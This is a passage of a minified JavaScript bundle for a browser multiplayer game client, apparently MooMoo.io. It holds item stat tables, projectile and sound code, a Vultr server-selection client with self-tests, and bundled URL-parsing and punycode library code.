"Windmill Hat", topSprite: !0, price: 1e4, scale: 120, desc: "generates points while worn", pps: 1.5}, {id: 11, name: "Spike Gear", topSprite: !0, price: 1e4, scale: 120, desc: "deal damage to players that damage you", dmg: 0.45}, {id: 53, name: "Turret Gear", topSprite: !0, price: 1e4, scale: 120, desc: "you become a walking turret", turret: {proj: 1, range: 700, rate: 2500}, spdMult: 0.7}, {id: 20, name: "Samurai Armor", price: 12e3, scale: 120, desc: "increased heal speed and fire rate", atkSpd: 0.78}, {id: 58, name: "Dark Knight", price: 12e3, scale: 120, desc: "restores health when you deal damage", healD: 0.4}, {id: 27, name: "Scavenger Gear", price: 15e3, scale: 120, desc: "earn double points for each kill", kScrM: 2}, {id: 40, name: "Tank Gear", price: 15e3, scale: 120, desc: "increased damage to buildings but slower movement", spdMult: 0.3, bDmg: 3.3}, {id: 52, name: "Thief Gear", price: 15e3, scale: 120, desc: "steal half of a players gold when you kill them", goldSteal: 0.5}, {id: 55, name: "Bloodthirster", price: 2e4, scale: 120, desc: "Restore Health when dealing damage. And increased damage", healD: 0.25, dmgMultO: 1.2}, {id: 56, name: "Assassin Gear", price: 2e4, scale: 120, desc: "Go invisible when not moving. Can't eat. Increased speed", noEat: !0, spdMult: 1.1, invisTimer: 1e3}], y.exports.accessories = [{id: 12, name: "Snowball", price: 1e3, scale: 105, xOff: 18, desc: "no effect"}, {id: 9, name: "Tree Cape", price: 1e3, scale: 90, desc: "no effect"}, {id: 10, name: "Stone Cape", price: 1e3, scale: 90, desc: "no effect"}, {id: 3, name: "Cookie Cape", price: 1500, scale: 90, desc: "no effect"}, {id: 8, name: "Cow Cape", price: 2e3, scale: 90, desc: "no effect"}, {id: 11, name: "Monkey Tail", price: 2e3, scale: 97, xOff: 25, desc: "Super speed but reduced damage", spdMult: 1.35, dmgMultO: 0.2}, {id: 17, name: "Apple Basket", price: 3e3, scale: 80, xOff: 12, desc: "slowly regenerates health over time", healthRegen: 1}, {id: 6, name: "Winter Cape", price: 3e3, scale: 90, desc: "no effect"}, {id: 4, name: "Skull Cape", price: 4e3, scale: 90, desc: "no effect"}, {id: 5, name: "Dash Cape", price: 5e3, scale: 90, desc: "no effect"}, {id: 2, name: "Dragon Cape", price: 6e3, scale: 90, desc: "no effect"}, {id: 1, name: "Super Cape", price: 8e3, scale: 90, desc: "no effect"}, {id: 7, name: "Troll Cape", price: 8e3, scale: 90, desc: "no effect"}, {id: 14, name: "Thorns", price: 1e4, scale: 115, xOff: 20, desc: "no effect"}, {id: 15, name: "Blockades", price: 1e4, scale: 95, xOff: 15, desc: "no effect"}, {id: 20, name: "Devils Tail", price: 1e4, scale: 95, xOff: 20, desc: "no effect"}, {id: 16, name: "Sawblade", price: 12e3, scale: 90, spin: !0, xOff: 0, desc: "deal damage to players that damage you", dmg: 0.15}, {id: 13, name: "Angel Wings", price: 15e3, scale: 138, xOff: 22, desc: "slowly regenerates health over time", healthRegen: 3}, {id: 19, name: "Shadow Wings", price: 15e3, scale: 138, xOff: 22, desc: "increased movement speed", spdMult: 1.1}, {id: 18, name: "Blood Wings", price: 2e4, scale: 178, xOff: 26, desc: "restores health when you deal damage", healD: 0.2}, {id: 21, name: "Corrupt X Wings", price: 2e4, scale: 178, xOff: 26, desc: "deal damage to players that damage you", dmg: 0.25}];
}, function (y, V) {
  y.exports = function (d, J, T, L, p, U, G) {
    this.init = function (g, H, N, h, X, F, Z, z, O) {
      this.active = !0, this.indx = g, this.x = H, this.y = N, this.dir = h, this.skipMov = !0, this.speed = X, this.dmg = F, this.scale = z, this.range = Z, this.owner = O, G && (this.sentTo = {});
    };
    var q, P = [];
    this.update = function (H) {
      if (this.active) {
        var N, X = this.speed * H;
        if (this.skipMov ? this.skipMov = !1 : (this.x += X * Math.cos(this.dir), this.y += X * Math.sin(this.dir), this.range -= X, this.range <= 0 && (this.x += this.range * Math.cos(this.dir), this.y += this.range * Math.sin(this.dir), X = 1, this.range = 0, this.active = !1)), G) {
          for (var F = 0; F < d.length; ++F) !this.sentTo[d[F].id] && d[F].canSee(this) && (this.sentTo[d[F].id] = 1, G.send(d[F].id, "18", U.fixTo(this.x, 1), U.fixTo(this.y, 1), U.fixTo(this.dir, 2), U.fixTo(this.range, 1), this.speed, this.indx, this.layer, this.sid));
          for (P.length = 0, F = 0; F < d.length + J.length; ++F) !(q = d[F] || J[F - d.length]).alive || q == this.owner || this.owner.team && q.team == this.owner.team || U.lineInRect(q.x - q.scale, q.y - q.scale, q.x + q.scale, q.y + q.scale, this.x, this.y, this.x + X * Math.cos(this.dir), this.y + X * Math.sin(this.dir)) && P.push(q);
          for (var Z = T.getGridArrays(this.x, this.y, this.scale), z = 0; z < Z.length; ++z) for (var O = 0; O < Z[z].length; ++O) N = (q = Z[z][O]).getScale(), q.active && this.ignoreObj != q.sid && this.layer <= q.layer && P.indexOf(q) < 0 && !q.ignoreCollision && U.lineInRect(q.x - N, q.y - N, q.x + N, q.y + N, this.x, this.y, this.x + X * Math.cos(this.dir), this.y + X * Math.sin(this.dir)) && P.push(q);
          if (P.length > 0) {
            var E = null, I = null, M = null;
            for (F = 0; F < P.length; ++F) M = U.getDistance(this.x, this.y, P[F].x, P[F].y), (null == I || M < I) && (I = M, E = P[F]);
            if (E.isPlayer || E.isAI) {
              var K = 0.3 * (E.weightM || 1);
              E.xVel += K * Math.cos(this.dir), E.yVel += K * Math.sin(this.dir), null != E.weaponIndex && L.weapons[E.weaponIndex].shield && U.getAngleDist(this.dir + Math.PI, E.dir) <= p.shieldAngle || E.changeHealth(-this.dmg, this.owner, this.owner);
            } else for (E.projDmg && E.health && E.changeHealth(-this.dmg) && T.disableObj(E), F = 0; F < d.length; ++F) d[F].active && (E.sentTo[d[F].id] && (E.active ? d[F].canSee(E) && G.send(d[F].id, "8", U.fixTo(this.dir, 2), E.sid) : G.send(d[F].id, "12", E.sid)), E.active || E.owner != d[F] || d[F].changeItemCount(E.group.id, -1));
            for (this.active = !1, F = 0; F < d.length; ++F) this.sentTo[d[F].id] && G.send(d[F].id, "19", this.sid, U.fixTo(I, 1));
          }
        }
      }
    };
  };
}, function (y, V) {
  y.exports = function (d, J, T, L, p, U, G, q, P) {
    this.addProjectile = function (H, N, X, F, Z, z, O, E, I) {
      for (var M, K = U.projectiles[z], R = 0; R < J.length; ++R) if (!J[R].active) {
        M = J[R];
        break;
      }
      return M || ((M = new d(T, L, p, U, G, q, P)).sid = J.length, J.push(M)), M.init(z, H, N, X, Z, K.dmg, F, K.scale, O), M.ignoreObj = E, M.layer = I || K.layer, M.src = K.src, M;
    };
  };
}, function (y, V) {
  y.exports.obj = function (d, J) {
    var T;
    this.sounds = [], this.active = !0, this.play = function (c, L, s) {
      L && this.active && ((T = this.sounds[c]) || (T = new Howl({src: ".././sound/" + c + ".mp3"}), this.sounds[c] = T), s && T.isPlaying || (T.isPlaying = !0, T.play(), T.volume((L || 1) * d.volumeMult), T.loop(s)));
    }, this.toggleMute = function (c, L) {
      (T = this.sounds[c]) && T.mute(L);
    }, this.stop = function (c) {
      (T = this.sounds[c]) && (T.stop(), T.isPlaying = !1);
    };
  };
}, function (y, V, d) {
  var J = d(60), T = d(67);
  function c(p, U, G, q, P) {
    "localhost" == location.hostname && (window.location.hostname = "127.0.0.1"), this.debugLog = !1, this.baseUrl = p, this.lobbySize = G, this.devPort = U, this.lobbySpread = q, this.rawIPs = !!P, this.server = void 0, this.gameIndex = void 0, this.callback = void 0, this.errorCallback = void 0, this.processServers(vultr.servers);
  }
  c.prototype.regionInfo = {0: {name: "Local", latitude: 0, longitude: 0}, "vultr:1": {name: "New Jersey", latitude: 40.1393329, longitude: -75.8521818}, "vultr:2": {name: "Chicago", latitude: 41.8339037, longitude: -87.872238}, "vultr:3": {name: "Dallas", latitude: 32.8208751, longitude: -96.8714229}, "vultr:4": {name: "Seattle", latitude: 47.6149942, longitude: -122.4759879}, "vultr:5": {name: "Los Angeles", latitude: 34.0207504, longitude: -118.691914}, "vultr:6": {name: "Atlanta", latitude: 33.7676334, longitude: -84.5610332}, "vultr:7": {name: "Amsterdam", latitude: 52.3745287, longitude: 4.7581878}, "vultr:8": {name: "London", latitude: 51.5283063, longitude: -0.382486}, "vultr:9": {name: "Frankfurt", latitude: 50.1211273, longitude: 8.496137}, "vultr:12": {name: "Silicon Valley", latitude: 37.4024714, longitude: -122.3219752}, "vultr:19": {name: "Sydney", latitude: -33.8479715, longitude: 150.651084}, "vultr:24": {name: "Paris", latitude: 48.8588376, longitude: 2.2773454}, "vultr:25": {name: "Tokyo", latitude: 35.6732615, longitude: 139.569959}, "vultr:39": {name: "Miami", latitude: 25.7823071, longitude: -80.3012156}, "vultr:40": {name: "Singapore", latitude: 1.3147268, longitude: 103.7065876}}, c.prototype.start = function (p, U) {
    this.callback = p, this.errorCallback = U;
    var G = this.parseServerQuery();
    G ? (this.log("Found server in query."), this.password = G[3], this.connect(G[0], G[1], G[2])) : (this.log("Pinging servers..."), this.pingServers());
  }, c.prototype.parseServerQuery = function () {
    var p = J.parse(location.href, !0), U = p.query.server;
    if ("string" == typeof U) {
      var G = U.split(":");
      if (3 == G.length) {
        var q = G[0], P = parseInt(G[1]), g = parseInt(G[2]);
        return "0" == q || q.startsWith("vultr:") || (q = "vultr:" + q), [q, P, g, p.query.password];
      }
      this.errorCallback("Invalid number of server parameters in " + U);
    }
  }, c.prototype.findServer = function (p, U) {
    var G = this.servers[p];
    if (Array.isArray(G)) {
      for (var q = 0; q < G.length; q++) {
        var P = G[q];
        if (P.index == U) return P;
      }
      console.warn("Could not find server in region " + p + " with index " + U + ".");
    } else this.errorCallback("No server list for region " + p);
  }, c.prototype.pingServers = function () {
    var p = this, U = [];
    for (var G in this.servers) if (this.servers.hasOwnProperty(G)) {
      var q = this.servers[G], P = q[Math.floor(Math.random() * q.length)];
      null != P ? function (g, H) {
        var N = new XMLHttpRequest;
        N.onreadystatechange = function (X) {
          var F = X.target;
          if (4 == F.readyState) if (200 == F.status) {
            for (var Z = 0; Z < U.length; Z++) U[Z].abort();
            p.log("Connecting to region", H.region);
            var z = p.seekServer(H.region);
            p.connect(z[0], z[1], z[2]);
          } else console.warn("Error pinging " + H.ip + " in region " + G);
        };
        var h = "//" + p.serverAddress(H.ip, !0) + ":" + p.serverPort(H) + "/ping";
        N.open("GET", h, !0), N.send(null), p.log("Pinging", h), U.push(N);
      }(0, P) : console.log("No target server for region " + G);
    }
  }, c.prototype.seekServer = function (p, U, G) {
    null == G && (G = "random"), null == U && (U = !1);
    const q = ["random"];
    var P = this.lobbySize, g = this.lobbySpread, H = this.servers[p].flatMap(function (O) {
      var E = 0;
      return O.games.map(function (I) {
        var M = E++;
        return {region: O.region, index: O.index * O.games.length + M, gameIndex: M, gameCount: O.games.length, playerCount: I.playerCount, isPrivate: I.isPrivate};
      });
    }).filter(function (O) {
      return !O.isPrivate;
    }).filter(function (O) {
      return !U || 0 == O.playerCount && O.gameIndex >= O.gameCount / 2;
    }).filter(function (O) {
      return "random" == G || q[O.index % q.length].key == G;
    }).sort(function (O, E) {
      return E.playerCount - O.playerCount;
    }).filter(function (O) {
      return O.playerCount < P;
    });
    if (U && H.reverse(), 0 != H.length) {
      var N = Math.min(g, H.length), X = Math.floor(Math.random() * N), F = H[X = Math.min(X, H.length - 1)], Z = F.region, z = (X = Math.floor(F.index / F.gameCount), F.index % F.gameCount);
      return this.log("Found server."), [Z, X, z];
    }
    this.errorCallback("No open servers.");
  }, c.prototype.connect = function (p, U, G) {
    if (!this.connected) {
      var q = this.findServer(p, U);
      null != q ? (this.log("Connecting to server", q, "with game index", G), q.games[G].playerCount >= this.lobbySize ? this.errorCallback("Server is already full.") : (window.history.replaceState(document.title, document.title, this.generateHref(p, U, G, this.password)), this.server = q, this.gameIndex = G, this.log("Calling callback with address", this.serverAddress(q.ip), "on port", this.serverPort(q), "with game index", G), this.callback(this.serverAddress(q.ip), this.serverPort(q), G))) : this.errorCallback("Failed to find server for region " + p + " and index " + U);
    }
  }, c.prototype.switchServer = function (p, U, G, q) {
    this.switchingServers = !0, window.location.href = this.generateHref(p, U, G, q);
  }, c.prototype.generateHref = function (p, U, G, q) {
    var P = "/?server=" + (p = this.stripRegion(p)) + ":" + U + ":" + G;
    return q && (P += "&password=" + encodeURIComponent(q)), P;
  }, c.prototype.serverAddress = function (p, U) {
    return "127.0.0.1" == p || "7f000001" == p || "903d62ef5d1c2fecdcaeb5e7dd485eff" == p ? window.location.hostname : this.rawIPs ? U ? "ip_" + this.hashIP(p) + "." + this.baseUrl : p : "ip_" + p + "." + this.baseUrl;
  }, c.prototype.serverPort = function (p) {
    return 0 == p.region ? this.devPort : location.protocol.startsWith("https") ? 443 : 80;
  }, c.prototype.processServers = function (p) {
    for (var U = {}, G = 0; G < p.length; G++) {
      var q = p[G], P = U[q.region];
      null == P && (P = [], U[q.region] = P), P.push(q);
    }
    for (var g in U) U[g] = U[g].sort(function (H, N) {
      return H.index - N.index;
    });
    this.servers = U;
  }, c.prototype.ipToHex = function (p) {
    return p.split(".").map(U => ("00" + parseInt(U).toString(16)).substr(-2)).join("").toLowerCase();
  }, c.prototype.hashIP = function (p) {
    return T(this.ipToHex(p));
  }, c.prototype.log = function () {
    return this.debugLog ? console.log.apply(void 0, arguments) : console.verbose ? console.verbose.apply(void 0, arguments) : void 0;
  }, c.prototype.stripRegion = function (p) {
    return p.startsWith("vultr:") ? p = p.slice(6) : p.startsWith("do:") && (p = p.slice(3)), p;
  }, window.testVultrClient = function () {
    var p = 1;
    function U(q, P) {
      (q = "" + q) == (P = "" + P) ? console.log("Assert " + p + " passed.") : console.warn("Assert " + p + " failed. Expected " + P + ", got " + q + "."), p++;
    }
    var G = new c("test.io", -1, 5, 1, !1);
    G.errorCallback = function (q) {}, G.processServers(function (q) {
      var P = [];
      for (var g in q) for (var H = q[g], N = 0; N < H.length; N++) P.push({ip: g + ":" + N, scheme: "testing", region: g, index: N, games: H[N].map(h => ({playerCount: h, isPrivate: !1}))});
      return P;
    }({1: [[0, 0, 0, 0], [0, 0, 0, 0]], 2: [[5, 1, 0, 0], [0, 0, 0, 0]], 3: [[5, 0, 1, 5], [0, 0, 0, 0]], 4: [[5, 1, 1, 5], [1, 0, 0, 0]], 5: [[5, 1, 1, 5], [1, 0, 4, 0]], 6: [[5, 5, 5, 5], [2, 3, 1, 4]], 7: [[5, 5, 5, 5], [5, 5, 5, 5]]})), U(G.seekServer(1, !1), [1, 0, 0]), U(G.seekServer(1, !0), [1, 1, 3]), U(G.seekServer(2, !1), [2, 0, 1]), U(G.seekServer(2, !0), [2, 1, 3]), U(G.seekServer(3, !1), [3, 0, 2]), U(G.seekServer(3, !0), [3, 1, 3]), U(G.seekServer(4, !1), [4, 0, 1]), U(G.seekServer(4, !0), [4, 1, 3]), U(G.seekServer(5, !1), [5, 1, 2]), U(G.seekServer(5, !0), [5, 1, 3]), U(G.seekServer(6, !1), [6, 1, 3]), U(G.seekServer(6, !0), void 0), U(G.seekServer(7, !1), void 0), U(G.seekServer(7, !0), void 0), console.log("Tests passed.");
  };
  var L = function (p, U) {
    return p.concat(U);
  };
  Array.prototype.flatMap = function (p) {
    return function (U, G) {
      return G.map(U).reduce(L, []);
    }(p, this);
  }, y.exports = c;
}, function (V, J, T) {
  "use strict";
  var L = T(61), U = T(63);
  function G() {
    this.protocol = null, this.slashes = null, this.auth = null, this.host = null, this.port = null, this.hostname = null, this.hash = null, this.search = null, this.query = null, this.pathname = null, this.path = null, this.href = null;
  }
  J.parse = w, J.resolve = function (R, S) {
    return w(R, !1, !0).resolve(S);
  }, J.resolveObject = function (R, S) {
    return R ? w(R, !1, !0).resolveObject(S) : S;
  }, J.format = function (R) {
    return U.isString(R) && (R = w(R)), R instanceof G ? R.format() : G.prototype.format.call(R);
  }, J.Url = G;
  var q = /^([a-z0-9.+-]+:)/i, P = /:[0-9]*$/, H = /^(\/\/?(?!\/)[^\?\s]*)(\?[^\s]*)?$/, N = ["{", "}", "|", "\\", "^", "`"].concat(["<", ">", '"', "`", " ", "\r", "\n", "	"]), X = ["'"].concat(N), F = ["%", "/", "?", ";", "#"].concat(X), Z = ["/", "?", "#"], z = /^[+a-z0-9A-Z_-]{0,63}$/, O = /^([+a-z0-9A-Z_-]{0,63})(.*)$/, E = {javascript: !0, "javascript:": !0}, I = {javascript: !0, "javascript:": !0}, M = {http: !0, https: !0, ftp: !0, gopher: !0, file: !0, "http:": !0, "https:": !0, "ftp:": !0, "gopher:": !0, "file:": !0}, K = T(64);
  function w(R, S, A) {
    if (R && U.isObject(R) && R instanceof G) return R;
    var Y = new G;
    return Y.parse(R, S, A), Y;
  }
  G.prototype.parse = function (Q, y0, y1) {
    if (!U.isString(Q)) throw new TypeError("Parameter 'url' must be a string, not " + typeof Q);
    var y2 = Q.indexOf("?"), y3 = -1 !== y2 && y2 < Q.indexOf("#") ? "?" : "#", y4 = Q.split(y3);
    y4[0] = y4[0].replace(/\\/g, "/");
    var y5 = Q = y4.join(y3);
    if (y5 = y5.trim(), !y1 && 1 === Q.split("#").length) {
      var y6 = H.exec(y5);
      if (y6) return this.path = y5, this.href = y5, this.pathname = y6[1], y6[2] ? (this.search = y6[2], this.query = y0 ? K.parse(this.search.substr(1)) : this.search.substr(1)) : y0 && (this.search = "", this.query = {}), this;
    }
    var y7 = q.exec(y5);
    if (y7) {
      var y8 = (y7 = y7[0]).toLowerCase();
      this.protocol = y8, y5 = y5.substr(y7.length);
    }
    if (y1 || y7 || y5.match(/^\/\/[^@\/]+@[^@\/]+/)) {
      var y9 = "//" === y5.substr(0, 2);
      !y9 || y7 && I[y7] || (y5 = y5.substr(2), this.slashes = !0);
    }
    if (!I[y7] && (y9 || y7 && !M[y7])) {
      for (var yy, yV, yd = -1, yJ = 0; yJ < Z.length; yJ++) -1 !== (yT = y5.indexOf(Z[yJ])) && (-1 === yd || yT < yd) && (yd = yT);
      for (-1 !== (yV = -1 === yd ? y5.lastIndexOf("@") : y5.lastIndexOf("@", yd)) && (yy = y5.slice(0, yV), y5 = y5.slice(yV + 1), this.auth = decodeURIComponent(yy)), yd = -1, yJ = 0; yJ < F.length; yJ++) {
        var yT;
        -1 !== (yT = y5.indexOf(F[yJ])) && (-1 === yd || yT < yd) && (yd = yT);
      }
      -1 === yd && (yd = y5.length), this.host = y5.slice(0, yd), y5 = y5.slice(yd), this.parseHost(), this.hostname = this.hostname || "";
      var yc = "[" === this.hostname[0] && "]" === this.hostname[this.hostname.length - 1];
      if (!yc) for (var yL = this.hostname.split(/\./), ys = (yJ = 0, yL.length); yJ < ys; yJ++) {
        var yp = yL[yJ];
        if (yp && !yp.match(z)) {
          for (var yU = "", yn = 0, yG = yp.length; yn < yG; yn++) yp.charCodeAt(yn) > 127 ? yU += "x" : yU += yp[yn];
          if (!yU.match(z)) {
            var yq = yL.slice(0, yJ), yP = yL.slice(yJ + 1), yg = yp.match(O);
            yg && (yq.push(yg[1]), yP.unshift(yg[2])), yP.length && (y5 = "/" + yP.join(".") + y5), this.hostname = yq.join(".");
            break;
          }
        }
      }
      this.hostname.length > 255 ? this.hostname = "" : this.hostname = this.hostname.toLowerCase(), yc || (this.hostname = L.toASCII(this.hostname));
      var yH = this.port ? ":" + this.port : "", yN = this.hostname || "";
      this.host = yN + yH, this.href += this.host, yc && (this.hostname = this.hostname.substr(1, this.hostname.length - 2), "/" !== y5[0] && (y5 = "/" + y5));
    }
    if (!E[y8]) for (yJ = 0, ys = X.length; yJ < ys; yJ++) {
      var yh = X[yJ];
      if (-1 !== y5.indexOf(yh)) {
        var yX = encodeURIComponent(yh);
        yX === yh && (yX = escape(yh)), y5 = y5.split(yh).join(yX);
      }
    }
    var yF = y5.indexOf("#");
    -1 !== yF && (this.hash = y5.substr(yF), y5 = y5.slice(0, yF));
    var yZ = y5.indexOf("?");
    if (-1 !== yZ ? (this.search = y5.substr(yZ), this.query = y5.substr(yZ + 1), y0 && (this.query = K.parse(this.query)), y5 = y5.slice(0, yZ)) : y0 && (this.search = "", this.query = {}), y5 && (this.pathname = y5), M[y8] && this.hostname && !this.pathname && (this.pathname = "/"), this.pathname || this.search) {
      yH = this.pathname || "";
      var yz = this.search || "";
      this.path = yH + yz;
    }
    return this.href = this.format(), this;
  }, G.prototype.format = function () {
    var R = this.auth || "";
    R && (R = (R = encodeURIComponent(R)).replace(/%3A/i, ":"), R += "@");
    var S = this.protocol || "", A = this.pathname || "", Y = this.hash || "", b = !1, x = "";
    this.host ? b = R + this.host : this.hostname && (b = R + (-1 === this.hostname.indexOf(":") ? this.hostname : "[" + this.hostname + "]"), this.port && (b += ":" + this.port)), this.query && U.isObject(this.query) && Object.keys(this.query).length && (x = K.stringify(this.query));
    var Q = this.search || x && "?" + x || "";
    return S && ":" !== S.substr(-1) && (S += ":"), this.slashes || (!S || M[S]) && !1 !== b ? (b = "//" + (b || ""), A && "/" !== A.charAt(0) && (A = "/" + A)) : b || (b = ""), Y && "#" !== Y.charAt(0) && (Y = "#" + Y), Q && "?" !== Q.charAt(0) && (Q = "?" + Q), S + b + (A = A.replace(/[?#]/g, function (D) {
      return encodeURIComponent(D);
    })) + (Q = Q.replace("#", "%23")) + Y;
  }, G.prototype.resolve = function (R) {
    return this.resolveObject(w(R, !1, !0)).format();
  }, G.prototype.resolveObject = function (R) {
    if (U.isString(R)) {
      var Y = new G;
      Y.parse(R, !1, !0), R = Y;
    }
    for (var Q = new G, D = Object.keys(this), W = 0; W < D.length; W++) {
      var j = D[W];
      Q[j] = this[j];
    }
    if (Q.hash = R.hash, "" === R.href) return Q.href = Q.format(), Q;
    if (R.slashes && !R.protocol) {
      for (var C = Object.keys(R), y0 = 0; y0 < C.length; y0++) {
        var y1 = C[y0];
        "protocol" !== y1 && (Q[y1] = R[y1]);
      }
      return M[Q.protocol] && Q.hostname && !Q.pathname && (Q.path = Q.pathname = "/"), Q.href = Q.format(), Q;
    }
    if (R.protocol && R.protocol !== Q.protocol) {
      if (!M[R.protocol]) {
        for (var y2 = Object.keys(R), y3 = 0; y3 < y2.length; y3++) {
          var y4 = y2[y3];
          Q[y4] = R[y4];
        }
        return Q.href = Q.format(), Q;
      }
      if (Q.protocol = R.protocol, R.host || I[R.protocol]) Q.pathname = R.pathname; else {
        for (var y5 = (R.pathname || "").split("/"); y5.length && !(R.host = y5.shift());) ;
        R.host || (R.host = ""), R.hostname || (R.hostname = ""), "" !== y5[0] && y5.unshift(""), y5.length < 2 && y5.unshift(""), Q.pathname = y5.join("/");
      }
      if (Q.search = R.search, Q.query = R.query, Q.host = R.host || "", Q.auth = R.auth, Q.hostname = R.hostname || R.host, Q.port = R.port, Q.pathname || Q.search) {
        var y6 = Q.pathname || "", y7 = Q.search || "";
        Q.path = y6 + y7;
      }
      return Q.slashes = Q.slashes || R.slashes, Q.href = Q.format(), Q;
    }
    var y8 = Q.pathname && "/" === Q.pathname.charAt(0), y9 = R.host || R.pathname && "/" === R.pathname.charAt(0), yy = y9 || y8 || Q.host && R.pathname, yV = yy, yd = Q.pathname && Q.pathname.split("/") || [], yJ = (y5 = R.pathname && R.pathname.split("/") || [], Q.protocol && !M[Q.protocol]);
    if (yJ && (Q.hostname = "", Q.port = null, Q.host && ("" === yd[0] ? yd[0] = Q.host : yd.unshift(Q.host)), Q.host = "", R.protocol && (R.hostname = null, R.port = null, R.host && ("" === y5[0] ? y5[0] = R.host : y5.unshift(R.host)), R.host = null), yy = yy && ("" === y5[0] || "" === yd[0])), y9) Q.host = R.host || "" === R.host ? R.host : Q.host, Q.hostname = R.hostname || "" === R.hostname ? R.hostname : Q.hostname, Q.search = R.search, Q.query = R.query, yd = y5; else if (y5.length) yd || (yd = []), yd.pop(), yd = yd.concat(y5), Q.search = R.search, Q.query = R.query; else if (!U.isNullOrUndefined(R.search)) return yJ && (Q.hostname = Q.host = yd.shift(), (yp = !!(Q.host && Q.host.indexOf("@") > 0) && Q.host.split("@")) && (Q.auth = yp.shift(), Q.host = Q.hostname = yp.shift())), Q.search = R.search, Q.query = R.query, U.isNull(Q.pathname) && U.isNull(Q.search) || (Q.path = (Q.pathname ? Q.pathname : "") + (Q.search ? Q.search : "")), Q.href = Q.format(), Q;
    if (!yd.length) return Q.pathname = null, Q.search ? Q.path = "/" + Q.search : Q.path = null, Q.href = Q.format(), Q;
    for (var yT = yd.slice(-1)[0], yc = (Q.host || R.host || yd.length > 1) && ("." === yT || ".." === yT) || "" === yT, yL = 0, ys = yd.length; ys >= 0; ys--) "." === (yT = yd[ys]) ? yd.splice(ys, 1) : ".." === yT ? (yd.splice(ys, 1), yL++) : yL && (yd.splice(ys, 1), yL--);
    if (!yy && !yV) for (; yL--; yL) yd.unshift("..");
    !yy || "" === yd[0] || yd[0] && "/" === yd[0].charAt(0) || yd.unshift(""), yc && "/" !== yd.join("/").substr(-1) && yd.push("");
    var yp, yU = "" === yd[0] || yd[0] && "/" === yd[0].charAt(0);
    return yJ && (Q.hostname = Q.host = yU ? "" : yd.length ? yd.shift() : "", (yp = !!(Q.host && Q.host.indexOf("@") > 0) && Q.host.split("@")) && (Q.auth = yp.shift(), Q.host = Q.hostname = yp.shift())), (yy = yy || Q.host && yd.length) && !yU && yd.unshift(""), yd.length ? Q.pathname = yd.join("/") : (Q.pathname = null, Q.path = null), U.isNull(Q.pathname) && U.isNull(Q.search) || (Q.path = (Q.pathname ? Q.pathname : "") + (Q.search ? Q.search : "")), Q.auth = R.auth || Q.auth, Q.slashes = Q.slashes || R.slashes, Q.href = Q.format(), Q;
  }, G.prototype.parseHost = function () {
    var R = this.host, S = P.exec(R);
    S && (":" !== (S = S[0]) && (this.port = S.substr(1)), R = R.substr(0, R.length - S.length)), R && (this.hostname = R);
  };
}, function (y, V, d) {
  (function (J, T) {
    var c;
    !function (L) {
      V && V.nodeType, J && J.nodeType;
      var U = "object" == typeof T && T;
      U.global !== U && U.window !== U && U.self;
      var G, q = 2147483647, P = 36, H = /^xn--/, N = /[^\x20-\x7E]/, X = /[\x2E\u3002\uFF0E\uFF61]/g, F = {overflow: "Overflow: input needs wider integers to process", "not-basic": "Illegal input >= 0x80 (not a basic code point)", "invalid-input": "Invalid input"}, Z = Math.floor, z = String.fromCharCode;
      function O(B) {
        throw new RangeError(F[B]);
      }
      function E(B, j) {
        for (var C = B.length, y0 = []; C--;) y0[C] = j(B[C]);
        return y0;
      }
      function M(B, j) {
        var C = B.split("@"), y0 = "";
        return C.length > 1 && (y0 = C[0] + "@", B = C[1]), y0 + E((B = B.replace(X, ".")).split("."), j).join(".");
      }
      function K(B) {
        for (var j, C, y0 = [], y1 = 0, y2 = B.length; y1 < y2;) (j = B.charCodeAt(y1++)) >= 55296 && j <= 56319 && y1 < y2 ? 56320 == (64512 & (C = B.charCodeAt(y1++))) ? y0.push(((1023 & j) << 10) + (1023 & C) + 65536) : (y0.push(j), y1--) : y0.push(j);
        return y0;
      }
      function R(B) {
        return E(B, function (j) {
          var C = "";
          return j > 65535 && (C += z((j -= 65536) >>> 10 & 1023 | 55296), j = 56320 | 1023 & j), C + z(j);
        }).join("");
      }
      function A(B) {
        return B - 48 < 10 ? B - 22 : B - 65 < 26 ? B - 65 : B - 97 < 26 ? B - 97 : P;
      }
      function Y(B, j) {
        return B + 22 + 75 * (B < 26) - ((0 != j) << 5);
      }
      function Q(B, j, C) {
        var y0 = 0;
        for (B = C ? Z(B / 700) : B >> 1, B += Z(B / j); B > 455; y0 += P) B = Z(B / 35);
        return Z(y0 + 36 * B / (B + 38));
      }
      function D(B) {
        var j, C, y0, y1, y2, y3, y4, y5, y6, y7, y8 = [], y9 = B.length, yy = 0, yV = 128, yd = 72;
        for ((C = B.lastIndexOf("-")) < 0 && (C = 0), y0 = 0; y0 < C; ++y0) B.charCodeAt(y0) >= 128 && O("not-basic"), y8.push(B.charCodeAt(y0));
        for (y1 = C > 0 ? C + 1 : 0; y1 < y9;) {
          for (y2 = yy, y3 = 1, y4 = P; y1 >= y9 && O("invalid-input"), ((y5 = A(B.charCodeAt(y1++))) >= P || y5 > Z((q - yy) / y3)) && O("overflow"), yy += y5 * y3, !(y5 < (y6 = y4 <= yd ? 1 : y4 >= yd + 26 ? 26 : y4 - yd)); y4 += P) y3 > Z(q / (y7 = P - y6)) && O("overflow"), y3 *= y7;
          yd = Q(yy - y2, j = y8.length + 1, 0 == y2), Z(yy / j) > q - yV && O("overflow"), yV += Z(yy / j), yy %= j, y8.splice(yy++, 0, yV);
        }
        return R(y8);
      }
      function W(B) {
        var j, C, y0, y1, y2, y3, y4, y5, y6, y7, y8, y9, yy, yV, yd, yJ = [];
        for (y9 = (B = K(B)).length, j = 128, C = 0, y2 = 72, y3 = 0; y3 < y9; ++y3) (y8 = B[y3]) < 128 && yJ.push(z(y8));
        for (y0 = y1 = yJ.length, y1 && yJ.push("-"); y0 < y9;) {
          for (y4 = q, y3 = 0; y3 < y9; ++y3) (y8 = B[y3]) >= j && y8 < y4 && (y4 = y8);
          for (y4 - j > Z((q - C) / (yy = y0 + 1)) && O("overflow"), C += (y4 - j) * yy, j = y4, y3 = 0; y3 < y9; ++y3) if ((y8 = B[y3]) < j && ++C > q && O("overflow"), y8 == j) {
            for (y5 = C, y6 = P; !(y5 < (y7 = y6 <= y2 ? 1 : y6 >= y2 + 26 ? 26 : y6 - y2)); y6 += P) yd = y5 - y7, yV = P - y7, yJ.push(z(Y(y7 + yd % yV, 0))), y5 = Z(yd / yV);
            yJ.push(z(Y(y5, 0))), y2 = Q(C, yy, y0 == y1), C = 0, ++y0;
          }
          ++C, ++j;
        }
        return yJ.join("");
      }
      G = {version: "1.4.1", ucs2: {decode: K, encode: R}, decode: D, encode: W, toASCII: function (B) {
        return M(B, function (j) {
          return N.test(j) ? "xn--" + W(j) : j;
